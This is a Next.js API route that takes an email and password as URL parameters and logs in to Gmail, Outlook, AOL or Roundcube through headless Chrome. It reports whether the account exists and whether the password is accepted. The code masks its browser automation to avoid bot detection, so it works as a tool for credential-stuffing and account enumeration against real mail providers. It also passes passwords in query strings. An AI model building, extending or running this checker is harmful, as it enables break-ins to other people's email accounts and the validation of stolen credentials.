import { NextResponse } from "next/server";
import puppeteer from "puppeteer-core";
import chromium from "@sparticuz/chromium-min";
import dns from 'dns';
import { promisify } from 'util';
import {
  localExecutablePath,
  isDev,
  userAgent,
  remoteExecutablePath,
} from "@/utils/utils";

const resolveMx = promisify(dns.resolveMx);

export const maxDuration = 60; // This function can run for a maximum of 60 seconds
export const dynamic = "force-dynamic";

const platformUrls = {
  gmail: "https://accounts.google.com/",
  outlook: "https://login.microsoftonline.com/",
  roundcube: "https://your-roundcube-url.com/",
  aol: "https://login.aol.com/",
};

const platformSelectors = {
  gmail: {
    input: "#identifierId",
    nextButton: "#identifierNext",
    passwordInput: "input[name='Passwd']",
    passwordNextButton: "#passwordNext",
    errorMessage: "//*[contains(text(), 'Couldn’t find your Google Account')]",
    loginFailed: "//*[contains(text(), 'Wrong password')]",
  },
  outlook: {
    input: "input[name='loginfmt']",
    nextButton: "#idSIButton9",
    passwordInput: "input[name='passwd']",
    passwordNextButton: "#idSIButton9",
    errorMessage: "//*[contains(text(), 'This username may be')] | //*[contains(text(), 'That Microsoft account doesn’t exist')] | //*[contains(text(), 'find an account with that')]",
    loginFailed: "//*[contains(text(), 'Your account or password is incorrect')]",
  },
  roundcube: {
    input: "input[name='user']",
    nextButton: "input[name='submitbutton']",
    passwordInput: "input[name='pass']",
    passwordNextButton: "input[name='submitbutton']",
    errorMessage: "//*[contains(text(), 'Login failed')]",
    loginFailed: "//*[contains(text(), 'Login failed')]",
  },
  aol: {
    input: "#login-username",
    nextButton: "#login-signin",
    passwordInput: "input[name='password']",
    passwordNextButton: "#login-signin",
    errorMessage: "//*[contains(text(), 'Sorry, we don’t recognize this email')] | //*[contains(text(), 'Sorry,')]",
    loginFailed: "//*[contains(text(), 'Invalid password')]",
  },
};

async function checkAccountAccess(email, password) {
  let browser = null;
  let emailExists = false;
  let accountAccess = false;

  try {
    const domain = email.split('@')[1];
    const mxRecords = await resolveMx(domain);
    if (!mxRecords || mxRecords.length === 0) {
      throw new Error('No MX records found');
    }

    const mailServer = mxRecords[0].exchange;
    let platform = '';

    if (mailServer.includes('outlook')) {
      platform = 'outlook';
    } else if (mailServer.includes('google') || mailServer.includes('gmail')) {
      platform = 'gmail';
    } else if (mailServer.includes('aol')) {
      platform = 'aol';
    } else if (mailServer.includes('roundcube')) {
      platform = 'roundcube';
    } else {
      throw new Error('Unsupported email service provider');
    }

    browser = await puppeteer.launch({
      ignoreDefaultArgs: ["--enable-automation"],
      args: isDev
        ? [
            "--disable-blink-features=AutomationControlled",
            "--disable-features=site-per-process",
            "-disable-site-isolation-trials",
          ]
        : [...chromium.args, "--disable-blink-features=AutomationControlled"],
      defaultViewport: { width: 1920, height: 1080 },
      executablePath: isDev
        ? localExecutablePath
        : await chromium.executablePath(remoteExecutablePath),
      headless: true, // Ensure headless mode is enabled
      debuggingPort: isDev ? 9222 : undefined,
    });

    const page = (await browser.pages())[0];
    await page.setUserAgent(userAgent);
    await page.setViewport({ width: 1920, height: 1080 });

    await page.goto(platformUrls[platform], { waitUntil: "networkidle2", timeout: 60000 });

    const { input, nextButton, passwordInput, passwordNextButton, errorMessage, loginFailed } = platformSelectors[platform];

    // Enter email
    await page.waitForSelector(input);
    await page.type(input, email);
    await page.waitForSelector(nextButton);
    await page.click(nextButton);

    await new Promise((resolve) => setTimeout(resolve, 3000));

    // Check if the email exists
    const emailErrorElements = await page.evaluate((xpath) => {
      const result = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
      const nodes = [];
      let node;
      while ((node = result.iterateNext())) {
        nodes.push(node);
      }
      return nodes.length;
    }, errorMessage);

    emailExists = emailErrorElements === 0;

    if (!emailExists) {
      throw new Error('Email not found');
    }

    // Enter password
    await page.waitForSelector(passwordInput);
    await page.type(passwordInput, password);
    await page.waitForSelector(passwordNextButton);
    await page.click(passwordNextButton);

    await new Promise((resolve) => setTimeout(resolve, 3000));

    // Check if login failed
    const loginErrorElements = await page.evaluate((xpath) => {
      const result = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
      const nodes = [];
      let node;
      while ((node = result.iterateNext())) {
        nodes.push(node);
      }
      return nodes.length;
    }, loginFailed);

    accountAccess = loginErrorElements === 0;
  } catch (err) {
    console.log(`Error checking account access: ${err.message}`);
  } finally {
    if (browser) {
      await browser.close();
    }
  }

  return { emailExists, accountAccess };
}

export async function GET(request) {
  const url = new URL(request.url);
  const email = url.searchParams.get("email");
  const password = url.searchParams.get("password");

  if (!email || !password) {
    return NextResponse.json({ error: "Missing email or password parameter" }, { status: 400 });
  }

  const { emailExists, accountAccess } = await checkAccountAccess(email, password);

  return NextResponse.json({ emailExists, accountAccess }, { status: 200 });
}
